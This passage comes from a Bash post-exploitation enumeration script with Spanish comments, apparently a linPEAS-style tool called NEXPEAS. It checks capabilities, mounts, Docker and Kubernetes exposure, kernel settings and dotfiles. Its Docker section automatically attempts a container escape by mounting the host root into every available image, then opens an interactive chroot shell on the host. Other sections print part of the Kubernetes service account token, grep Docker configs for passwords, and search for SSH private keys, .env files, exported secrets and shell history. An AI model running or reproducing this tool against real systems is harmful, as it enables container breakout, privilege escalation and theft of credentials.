                    echo -e "${RED}  cap_dac_read_search → read any file${NC}"
                    echo -e "${RED}  cap_chown         → privilege escalation${NC}"
                fi
            fi
        else
            info "No capability information in /proc/self/status"
        fi
    fi
    echo ""

    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}2. DISPOSITIVOS DEL HOST VISIBLES${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo ""

    echo -e "${YELLOW}Dispositivos de bloque (lsblk):${NC}"
    if command -v lsblk &> /dev/null; then
        DEVICES=$(lsblk 2>/dev/null)
        if [ ! -z "$DEVICES" ]; then
            echo "$DEVICES" | sed 's/^/  /'
            alert_high "🔴 Host devices visible - posible mountpoint escalation"
        else
            info "lsblk not available"
        fi
    else
        info "lsblk not installed"
    fi
    echo ""

    echo -e "${YELLOW}Información de discos (fdisk):${NC}"
    if command -v fdisk &> /dev/null; then
        FDISK=$(fdisk -l 2>/dev/null | head -10)
        if [ ! -z "$FDISK" ]; then
            echo "$FDISK" | sed 's/^/  /'
            alert_high "🔴 Disk information accessible"
        fi
    else
        info "fdisk not installed"
    fi
    echo ""

    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}3. MONTAJES SENSIBLES${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo ""

    echo -e "${YELLOW}Montajes actuales (mount):${NC}"
    MOUNTS=$(mount 2>/dev/null | grep -E "docker\.sock|/proc|/sys|/dev|^/dev" | head -10)
    if [ ! -z "$MOUNTS" ]; then
        echo "$MOUNTS" | sed 's/^/  /'
        if echo "$MOUNTS" | grep -q "docker\.sock"; then
            alert_critical "🔴 CRITICAL: /var/run/docker.sock mounted (already checked above)"
        fi
        if echo "$MOUNTS" | grep -qE "/proc.*rw|/sys.*rw"; then
            alert_high "🔴 /proc o /sys montados con permisos RW"
        fi
    fi
    echo ""

    echo -e "${YELLOW}Análisis de montajes (findmnt):${NC}"
    if command -v findmnt &> /dev/null; then
        FINDMNT=$(findmnt 2>/dev/null | grep -E "docker\.sock|/proc|/sys" | head -5)
        if [ ! -z "$FINDMNT" ]; then
            echo "$FINDMNT" | sed 's/^/  /'
        else
            info "No sensitive mounts detected via findmnt"
        fi
    else
        info "findmnt not available"
    fi
    echo ""

    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}4. KUBERNETES - SERVICE ACCOUNT${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo ""

    if [ -d /run/secrets/kubernetes.io/serviceaccount/ ]; then
        alert_critical "🟦 KUBERNETES DETECTED - Running in K8s pod"
        echo ""

        echo -e "${YELLOW}Service Account Token:${NC}"
        if [ -f /run/secrets/kubernetes.io/serviceaccount/token ]; then
            alert_high "🔴 K8s token found at /run/secrets/kubernetes.io/serviceaccount/token"
            TOKEN=$(head -c 50 /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
            echo "  Token (first 50 chars): $TOKEN..."
        fi
        echo ""

        echo -e "${YELLOW}Service Account Info:${NC}"
        if [ -f /run/secrets/kubernetes.io/serviceaccount/namespace ]; then
            NAMESPACE=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
            echo "  Namespace: $NAMESPACE"
        fi

        if [ -f /run/secrets/kubernetes.io/serviceaccount/ca.crt ]; then
            echo "  CA Certificate: Found"
        fi
        echo ""

        echo -e "${YELLOW}Posibles vectores de escape K8s:${NC}"
        echo "  - Explotar permisos RBAC del service account"
        echo "  - Acceder a la API de Kubernetes (/var/run/secrets/kubernetes.io/...)"
        echo "  - Buscar pods privilegiados o con hostPath mounts"
        echo "  - Token hijacking si está disponible"
    else
        info "Not running in Kubernetes"
    fi
    echo ""

    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}5. SECCOMP & APPARMOR RESTRICTIONS${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo ""

    if [ -f /proc/self/status ]; then
        SECCOMP=$(grep Seccomp /proc/self/status 2>/dev/null)
        if [ ! -z "$SECCOMP" ]; then
            echo "$SECCOMP" | sed 's/^/  /'
            if echo "$SECCOMP" | grep -q "Seccomp:.*0"; then
                alert_high "🔴 Seccomp disabled or minimal restrictions"
            fi
        fi
    fi
    echo ""

    if [ -f /proc/self/attr/current ]; then
        APPARMOR=$(cat /proc/self/attr/current 2>/dev/null)
        if [ ! -z "$APPARMOR" ] && [ "$APPARMOR" != "unconfined" ]; then
            echo -e "${YELLOW}AppArmor Profile: $APPARMOR${NC}"
        fi
    fi
    echo ""

    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}6. RESUMEN DE VECTORES DE ESCAPE DISPONIBLES${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Orden de intento de escape (por probabilidad):${NC}"
    echo "  1️⃣  Docker socket access → docker run -v /:/host/ ..."
    echo "  2️⃣  CAP_SYS_ADMIN → nsenter, unshare exploits"
    echo "  3️⃣  Privileged container → device access, mount syscalls"
    echo "  4️⃣  K8s token abuse → RBAC exploitation"
    echo "  5️⃣  Host device mount → mount host filesystem"
    echo "  6️⃣  /proc or /sys RW → kernel memory manipulation"
    echo ""
    echo -e "${RED}NO ASUMIR: .dockerenv existe → puedo escapar${NC}"
    echo -e "${YELLOW}Verifica TODOS los vectores para máximas probabilidades de éxito${NC}"
    echo ""

fi

# DOCKER - ANÁLISIS Y ESCAPE
# ============================================
print_header "🐳 DOCKER - CONFIGURACIÓN Y VECTORES DE ESCAPE"
echo ""

echo -e "${BLUE}Docker daemon status:${NC}"
if command -v docker &> /dev/null; then
    if docker ps 2>/dev/null >/dev/null; then
        alert_critical "🔴 CRITICAL: Docker daemon accesible (posible escape)"
        docker ps 2>/dev/null | sed 's/^/  /'
    else
        info "Docker instalado pero no corriendo/accesible"
    fi
else
    info "Docker no instalado"
fi
echo ""

if [ $IN_CONTAINER -eq 1 ] || command -v docker &> /dev/null; then
    echo -e "${BLUE}Docker images disponibles:${NC}"
    DOCKER_IMAGES=$(docker images 2>/dev/null)
    if [ ! -z "$DOCKER_IMAGES" ]; then
        echo "$DOCKER_IMAGES" | sed 's/^/  /'
        IMAGES_COUNT=$(echo "$DOCKER_IMAGES" | wc -l)
        alert_high "🔴 $IMAGES_COUNT imágenes disponibles - Posible vector de escape (docker run -it -v /:/host/ IMAGE chroot /host/ bash)"
    else
        info "No images found"
    fi
    echo ""

    echo -e "${BLUE}Docker volumes:${NC}"
    DOCKER_VOLUMES=$(docker volume ls 2>/dev/null)
    if [ ! -z "$DOCKER_VOLUMES" ]; then
        echo "$DOCKER_VOLUMES" | sed 's/^/  /'
    else
        info "No volumes"
    fi
    echo ""

    echo -e "${BLUE}Docker networks:${NC}"
    DOCKER_NETWORKS=$(docker network ls 2>/dev/null)
    if [ ! -z "$DOCKER_NETWORKS" ]; then
        echo "$DOCKER_NETWORKS" | sed 's/^/  /'
    else
        info "No networks"
    fi
    echo ""

    echo -e "${BLUE}Container info (inspect current):${NC}"
    CONTAINER_ID=$(docker ps --no-trunc --quiet 2>/dev/null | head -1)
    if [ ! -z "$CONTAINER_ID" ]; then
        alert_medium "Current container: $CONTAINER_ID"
        docker inspect "$CONTAINER_ID" 2>/dev/null | grep -E "Mounts|Env|Ports" | sed 's/^/  /'
    fi
    echo ""
fi

echo -e "${BLUE}Docker socket access:${NC}"
DOCKER_SOCKET_WRITABLE=0
if [ -S /var/run/docker.sock ]; then
    if [ -w /var/run/docker.sock ]; then
        alert_critical "🔴 CRITICAL: /var/run/docker.sock is writable!"
        DOCKER_SOCKET_WRITABLE=1
    else
        echo "  /var/run/docker.sock exists (not writable by current user)"
    fi
else
    info "Docker socket not found"
fi
echo ""

# Intentar escape automático si estamos en contenedor y tenemos docker
if [ $IN_CONTAINER -eq 1 ] && [ $DOCKER_SOCKET_WRITABLE -eq 1 ] && command -v docker &> /dev/null; then
    echo -e "${RED}${BOLD}🚀 INTENTO AUTOMÁTICO DE ESCAPE DE CONTENEDOR - PROBANDO TODAS LAS IMÁGENES${NC}"
    echo ""

    # Obtener todas las imágenes disponibles
    DOCKER_IMAGES_LIST=$(docker images --quiet 2>/dev/null)

    if [ ! -z "$DOCKER_IMAGES_LIST" ]; then
        WORKING_IMAGE=""
        IMAGE_COUNT=$(echo "$DOCKER_IMAGES_LIST" | wc -l)
        TESTED_COUNT=0
        SUCCESS_COUNT=0

        echo -e "${YELLOW}Encontradas $IMAGE_COUNT imágenes. Probando cada una...${NC}"
        echo ""

        # Iterar sobre cada imagen
        while IFS= read -r ESCAPE_IMAGE; do
            ((TESTED_COUNT++))
            IMAGE_NAME=$(docker inspect --format='{{.RepoTags}}' "$ESCAPE_IMAGE" 2>/dev/null | head -1 || echo "$ESCAPE_IMAGE")

            echo -ne "${BLUE}[$TESTED_COUNT/$IMAGE_COUNT]${NC} Probando: ${CYAN}$IMAGE_NAME${NC} ... "

            # Intento de escape
            ESCAPE_RESULT=$(timeout 2 docker run --rm -v /:/host/ "$ESCAPE_IMAGE" sh -c "id; pwd; echo 'ESCAPE_OK'" 2>&1 || echo "TIMEOUT_OR_ERROR")

            if echo "$ESCAPE_RESULT" | grep -q "ESCAPE_OK"; then
                echo -e "${GREEN}✅ ¡FUNCIONA!${NC}"
                WORKING_IMAGE="$ESCAPE_IMAGE"
                ((SUCCESS_COUNT++))
                # Mostrar datos obtenidos
                echo "$ESCAPE_RESULT" | sed 's/^/    /'
                echo ""
            else
                echo -e "${RED}❌${NC}"
            fi
        done <<< "$DOCKER_IMAGES_LIST"

        echo ""
        echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "Resumen: $SUCCESS_COUNT de $IMAGE_COUNT imágenes pueden escapar"
        echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo ""

        if [ ! -z "$WORKING_IMAGE" ]; then
            WORKING_IMAGE_NAME=$(docker inspect --format='{{.RepoTags}}' "$WORKING_IMAGE" 2>/dev/null | head -1 || echo "$WORKING_IMAGE")
            alert_critical "✅ ESCAPE EXITOSO! Imagen ganadora: $WORKING_IMAGE_NAME"
            echo ""
            ((CRITICAL++))

            # Ofrecer consola interactiva
            echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            echo -e "${YELLOW}¿Quieres una consola interactiva en el host? [S/n]${NC}"
            echo -e "${CYAN}(Usaré la imagen: $WORKING_IMAGE_NAME)${NC}"
            echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            echo ""

            # Leer respuesta con timeout (30 segundos)
            read -t 30 -p "Respuesta: " INTERACTIVE_CHOICE

            if [[ "$INTERACTIVE_CHOICE" =~ ^[Ss]$ ]] || [ -z "$INTERACTIVE_CHOICE" ]; then
                echo ""
                alert_critical "🚀 ABRIENDO CONSOLA INTERACTIVA EN HOST..."
                echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo -e "${GREEN}INGRESASTE AL HOST (FUERA DEL CONTENEDOR)${NC}"
                echo -e "${GREEN}Imagen: $WORKING_IMAGE_NAME${NC}"
                echo -e "${GREEN}Prompt: host# ${NC}"
                echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo ""

                # Abrir shell interactiva escapada
                docker run --rm -it -v /:/host/ "$WORKING_IMAGE" chroot /host/ bash 2>/dev/null || docker run --rm -it -v /:/host/ "$WORKING_IMAGE" chroot /host/ sh 2>/dev/null || true

                echo ""
                echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                alert_critical "✅ Consola escapada cerrada"
                echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo ""
            else
                info "Consola interactiva cancelada"
                echo ""
            fi
        else
            alert_high "⚠️  Ninguna imagen pudo escapar - Posible restricción de Docker"
            echo ""
        fi
    else
        info "No Docker images available for escape attempt"
    fi
    echo ""
fi

echo -e "${BLUE}Archivos de configuración de Docker:${NC}"
DOCKER_CONFIGS=(
    ~/.docker/config.json
    /etc/docker/daemon.json
    ~/.dockercfg
    /root/.docker/config.json
)

FOUND_DOCKER_CONFIG=0
for config in "${DOCKER_CONFIGS[@]}"; do
    config_expanded="${config/#~/$HOME}"
    if [ -f "$config_expanded" ]; then
        alert_high "🔑 DOCKER CONFIG: $config_expanded"
        grep -iE "auth|username|password|registry" "$config_expanded" 2>/dev/null | sed 's/^/  /'
        ((FOUND_DOCKER_CONFIG++))
    fi
done

if [ $FOUND_DOCKER_CONFIG -eq 0 ]; then
    info "No docker config files found"
fi
echo ""

# ============================================
# ARCHIVOS EJECUTABLES EN DIRECTORIOS RAROS
# ============================================
print_header "⚔️  EJECUTABLES EN DIRECTORIOS SOSPECHOSOS"

echo -e "${BLUE}Binarios custom ejecutables:${NC}"
CUSTOM_BINS=$(timeout 3 find /home /opt -maxdepth 2 -perm /111 -type f 2>/dev/null | grep -v "\.git" | head -5)
if [ ! -z "$CUSTOM_BINS" ]; then
    echo "$CUSTOM_BINS" | while read bin; do
        alert_medium "EXECUTABLE: $bin"
    done
else
    info "No se encontraron binarios custom"
fi
echo ""

# ============================================
# ARCHIVOS CON PERMISOS ESPECIALES
# ============================================
print_header "🛡️  ARCHIVOS CON PERMISOS ESPECIALES"

echo -e "${BLUE}Archivos SGID en /home:${NC}"
SGID=$(find /home -perm -2000 -type f 2>/dev/null)
if [ ! -z "$SGID" ]; then
    echo "$SGID" | sed 's/^/  /'
else
    info "No se encontraron archivos SGID"
fi
echo ""

echo -e "${BLUE}Archivos con sticky bit:${NC}"
STICKY=$(find /home -perm -1000 -type f 2>/dev/null | head -5)
if [ ! -z "$STICKY" ]; then
    echo "$STICKY" | sed 's/^/  /'
else
    info "No se encontraron archivos con sticky bit"
fi
echo ""

# ============================================
# BÚSQUEDA DE PALABRAS CLAVE SENSIBLES
# ============================================
print_header "🔍 PALABRAS CLAVE SENSIBLES EN ARCHIVOS"

echo -e "${BLUE}Buscando palabras clave peligrosas:${NC}"
KEYWORDS=("password=" "api_key=" "secret_key=")

for keyword in "${KEYWORDS[@]}"; do
    FOUND=$(timeout 5 find /home /opt /var/www -maxdepth 2 -type f \( -name "*.py" -o -name "*.php" -o -name "*.js" -o -name "*.env" \) 2>/dev/null | \
            xargs grep -l "$keyword" 2>/dev/null | head -2)
    if [ ! -z "$FOUND" ]; then
        echo "$FOUND" | while read file; do
            alert_high "KEYWORD '$keyword': $file"
        done
    fi
done
echo ""

# ============================================
# ARCHIVOS MÁS SENSIBLES - BÚSQUEDA COMPLETA
# ============================================
print_header "⚠️  ARCHIVOS SENSIBLES - BÚSQUEDA COMPLETA"

echo -e "${LIME}Buscando archivos con información sensible...${NC}\n"

# Patrones de archivos sensibles
SENSITIVE_PATTERNS=(
    "user.txt"
    "root.txt"
    "flag.txt"
    "proof.txt"
    ".env"
    "id_rsa"
    "id_ed25519"
    "private_key"
    "password*"
    "credentials*"
    "secrets*"
    ".aws*"
    "config.php"
    "wp-config.php"
    "database.yml"
    "settings.py"
)

echo -e "${BOLD}Archivos Encontrados:${NC}"
SENSITIVE_COUNT=0

for pattern in "${SENSITIVE_PATTERNS[@]}"; do
    FOUND=$(timeout 2 find /home /root /opt /var/www /tmp -maxdepth 3 -iname "$pattern" -type f 2>/dev/null | head -3)
    if [ ! -z "$FOUND" ]; then
        echo "$FOUND" | while read sfile; do
            if [[ "$sfile" == *"user.txt"* ]] || [[ "$sfile" == *"root.txt"* ]] || [[ "$sfile" == *"flag"* ]]; then
                alert_critical "🚩 FLAG/PRIZE: $sfile"
                ((SENSITIVE_COUNT++))
            elif [[ "$sfile" == *"id_rsa"* ]] || [[ "$sfile" == *"private_key"* ]]; then
                alert_high "🔑 PRIVATE KEY: $sfile"
                ((SENSITIVE_COUNT++))
            elif [[ "$sfile" == *".env"* ]] || [[ "$sfile" == *"password"* ]] || [[ "$sfile" == *"config"* ]]; then
                alert_high "⚙️  CONFIG/CREDENTIALS: $sfile"
                ((SENSITIVE_COUNT++))
            else
                alert_medium "📄 SENSITIVE: $sfile"
                ((SENSITIVE_COUNT++))
            fi
        done
    fi
done

if [ $SENSITIVE_COUNT -eq 0 ]; then
    info "No se encontraron archivos sensibles obvios"
fi
echo ""

# ============================================
# SSH KEYS Y AUTHORIZED_KEYS
# ============================================
print_header "🔑 SSH KEYS - ANÁLISIS COMPLETO"

echo -e "${BLUE}SSH keys en el sistema:${NC}"
SSH_KEYS=$(timeout 3 find /home /root -maxdepth 3 \( -name "id_*" -o -name "*_rsa" -o -name "*_ed25519" \) 2>/dev/null | grep -v ".pub" | head -10)
if [ ! -z "$SSH_KEYS" ]; then
    echo "$SSH_KEYS" | while read key; do
        if [ -f "$key" ]; then
            alert_high "SSH KEY: $key"
        fi
    done
else
    info "No se encontraron SSH keys privadas"
fi
echo ""

echo -e "${BLUE}authorized_keys encontrados:${NC}"
AUTH_KEYS=$(find /home /root -name "authorized_keys" 2>/dev/null)
if [ ! -z "$AUTH_KEYS" ]; then
    echo "$AUTH_KEYS" | while read authkey; do
        COUNT=$(wc -l < "$authkey")
        alert_medium "authorized_keys: $authkey ($COUNT keys)"
    done
else
    info "No se encontraron authorized_keys"
fi
echo ""

# ============================================
# APLICACIONES ESPECIALES
# ============================================
print_header "🎪 APLICACIONES ESPECIALES - BÚSQUEDA"

echo -e "${BLUE}Aplicaciones potencialmente explotables:${NC}"
SPECIAL_APPS=("tomcat" "jboss" "jenkins" "sonarqube" "elasticsearch" "kibana" "grafana" "prometheus" "vault" "consul")

for app in "${SPECIAL_APPS[@]}"; do
    if ps aux | grep -i "$app" | grep -v grep > /dev/null; then
        alert_high "APLICACIÓN: $app ejecutándose"
    elif command -v $app &> /dev/null; then
        alert_medium "APLICACIÓN: $app instalada"
    fi
done
echo ""

# ============================================
# ARCHIVOS TEMPORALES Y LOGS
# ============================================
print_header "📋 ARCHIVOS TEMPORALES Y LOGS"

echo -e "${BLUE}Archivos interesantes en /tmp:${NC}"
TMP_INTERESTING=$(timeout 2 find /tmp -maxdepth 1 -type f \( -name "*.log" -o -name "*credentials*" -o -name "*password*" \) 2>/dev/null | head -5)
if [ ! -z "$TMP_INTERESTING" ]; then
    echo "$TMP_INTERESTING" | while read tmpfile; do
        alert_high "TEMP FILE: $tmpfile"
    done
else
    info "No hay archivos interesantes en /tmp"
fi
echo ""

echo -e "${BLUE}Logs con información sensible:${NC}"
LOG_CREDS=$(timeout 5 find /var/log -maxdepth 1 -type f -name "*.log" 2>/dev/null | \
            xargs grep -l -i "password\|error" 2>/dev/null | head -3)
if [ ! -z "$LOG_CREDS" ]; then
    echo "$LOG_CREDS" | while read logfile; do
        alert_medium "LOG: $logfile (contiene info sensible)"
    done
else
    info "No se encontraron logs con credenciales obvias"
fi
echo ""

# ============================================
# ARCHIVOS SSH
# ============================================
print_header "SSH - ANÁLISIS DE KEYS"

echo -e "${BLUE}Directorio SSH del usuario:${NC}"
if [ -d ~/.ssh ]; then
    if [ -f ~/.ssh/id_rsa ] || [ -f ~/.ssh/id_ed25519 ]; then
        alert_medium "Claves privadas SSH encontradas en ~/.ssh"
        ls -la ~/.ssh/ | grep "id_" | sed 's/^/  /'
    fi
    if [ -f ~/.ssh/authorized_keys ]; then
        alert_medium "authorized_keys encontrado:"
        wc -l ~/.ssh/authorized_keys | awk '{print "  " $1 " keys autorizadas"}'
    fi
else
    info "No hay directorio ~/.ssh"
fi
echo ""

# ============================================
# ARCHIVOS WORLD-WRITABLE
# ============================================
print_header "ARCHIVOS WORLD-WRITABLE - RIESGOS"

echo -e "${BLUE}Archivos world-writable en directorios críticos:${NC}"
CRITICAL_DIRS="/tmp /var/tmp /opt"
for dir in $CRITICAL_DIRS; do
    if [ -d "$dir" ]; then
        WRITABLE=$(timeout 2 find "$dir" -maxdepth 1 -perm -002 -type f 2>/dev/null | head -3)
        if [ ! -z "$WRITABLE" ]; then
            alert_high "World-writable en $dir:"
            echo "$WRITABLE" | sed 's/^/  /'
        fi
    fi
done
echo ""

# ============================================
# KERNEL EXPLOITS
# ============================================
print_header "💥 KERNEL - POTENCIAL DE EXPLOITS"

echo -e "${BLUE}Versión del Kernel:${NC}"
KERNEL_VERSION=$(uname -r)
echo "  $KERNEL_VERSION"
echo ""

echo -e "${BLUE}Verificaciones de protecciones del kernel:${NC}"
if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
    VALUE=$(cat /proc/sys/kernel/unprivileged_userns_clone)
    if [ "$VALUE" = "1" ]; then
        alert_high "Unprivileged namespaces enabled (posible CVE-2016-5195)"
    fi
fi

if [ -f /proc/sys/kernel/kptr_restrict ]; then
    VALUE=$(cat /proc/sys/kernel/kptr_restrict)
    if [ "$VALUE" = "0" ]; then
        alert_medium "kptr_restrict disabled"
    fi
fi

if [ -f /proc/sys/kernel/yama/ptrace_scope ]; then
    VALUE=$(cat /proc/sys/kernel/yama/ptrace_scope)
    if [ "$VALUE" = "0" ]; then
        alert_medium "ptrace sin restricciones"
    fi
fi
echo ""

if [ $DEEP_MODE -eq 1 ]; then
    # ============================================
    # DOTFILES CONFIGURATION ANALYSIS
    # ============================================
    print_header "📝 ANÁLISIS DE DOTFILES - CONFIGURACIÓN DE SHELL"

    echo -e "${BLUE}~/.bashrc:${NC}"
    if [ -f ~/.bashrc ]; then
        BASHRC_SIZE=$(wc -l < ~/.bashrc 2>/dev/null)
        echo "  Encontrado ($BASHRC_SIZE líneas)"
        echo -e "${YELLOW}  - Exports de credenciales:${NC}"
        grep -E "export.*PASS|export.*KEY|export.*TOKEN|export.*API|export.*SECRET|export.*USER|export.*CRED" ~/.bashrc 2>/dev/null | sed 's/^/    /' || echo "    (ninguno detectado)"
        echo -e "${YELLOW}  - Aliases potencialmente problemáticos:${NC}"
        grep "^alias " ~/.bashrc 2>/dev/null | grep -E "sudo|root|rm|chmod" | sed 's/^/    /' || echo "    (ninguno detectado)"
    else
        info "~/.bashrc no encontrado"
    fi
    echo ""

    echo -e "${BLUE}~/.profile:${NC}"
    if [ -f ~/.profile ]; then
        PROFILE_SIZE=$(wc -l < ~/.profile 2>/dev/null)
        echo "  Encontrado ($PROFILE_SIZE líneas)"
        grep -E "export.*PASS|export.*KEY|export.*TOKEN|export.*API|export.*SECRET" ~/.profile 2>/dev/null | sed 's/^/    /' || echo "    (sin exports sensibles)"
    else
        info "~/.profile no encontrado"
    fi
    echo ""

    echo -e "${BLUE}~/.bash_history (últimas 10 líneas interesantes):${NC}"
    if [ -f ~/.bash_history ]; then
        grep -iE "password|pass|pwd|sudo|ssh|curl|wget|api|token|secret|credential" ~/.bash_history 2>/dev/null | tail -10 | sed 's/^/  /' | head -5 || info "Sin comandos sensibles en historial"
    else
        info "~/.bash_history no encontrado"
    fi
    echo ""

    echo -e "${BLUE}~/.ssh/config (si existe):${NC}"
    if [ -f ~/.ssh/config ]; then
        echo -e "${ORANGE}  ⚠️  SSH config file encontrado${NC}"
        grep -E "^Host|^User|^Port|IdentityFile" ~/.ssh/config 2>/dev/null | sed 's/^/    /' || echo "    (no contenido)"
    else
        info "~/.ssh/config no encontrado"
    fi
    echo ""
fi

# ============================================
# RESUMEN FINAL
# ============================================
print_header "📊 RESUMEN DE HALLAZGOS"

echo -e "\n${PINK}╔════════════════════════════════════════╗${NC}"
echo -e "${RED}│  ⛔  CRÍTICOS:       $CRITICAL${NC}${PINK}              │${NC}"
echo -e "${ORANGE}│  🔥  ALTOS:         $HIGH${NC}${PINK}               │${NC}"
echo -e "${YELLOW}│  ⚠️   MEDIOS:        $MEDIUM${NC}${PINK}              │${NC}"
echo -e "${PINK}╚════════════════════════════════════════╝${NC}"
echo ""

if [ $CRITICAL -gt 0 ]; then
    echo -e "${RED}╔════════════════════════════════════════╗${NC}"
    echo -e "${RED}║ 🚨 ¡VULNERABILIDADES CRÍTICAS! 🚨      ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════╝${NC}"
elif [ $HIGH -gt 0 ]; then
    echo -e "${ORANGE}╔════════════════════════════════════════╗${NC}"
    echo -e "${ORANGE}║ 🔥 VECTORES DE ESCALACIÓN DETECTADOS   ║${NC}"
    echo -e "${ORANGE}╚════════════════════════════════════════╝${NC}"
else
    echo -e "${LIME}╔════════════════════════════════════════╗${NC}"
    echo -e "${LIME}║ ✨ Sistema Bien Configurado ✨         ║${NC}"
    echo -e "${LIME}╚════════════════════════════════════════╝${NC}"
fi

echo ""
echo -e "${PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}${MAGENTA}📋 PRÓXIMOS PASOS:${NC}"
echo -e "${CYAN}   ① Investigar hallazgos CRÍTICOS/ALTOS${NC}"
echo -e "${CYAN}   ② Probar técnicas de escalación${NC}"
echo -e "${CYAN}   ③ Revisar misconfigurations de apps${NC}"
echo -e "${CYAN}   ④ Análisis de logs: /var/log/auth.log${NC}"
echo -e "${CYAN}   ⑤ Explorar archivos interesantes${NC}"
echo -e "${PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "\n${LIME}✨ Escaneo completado con NEXPEAS 🐢${NC}\n"
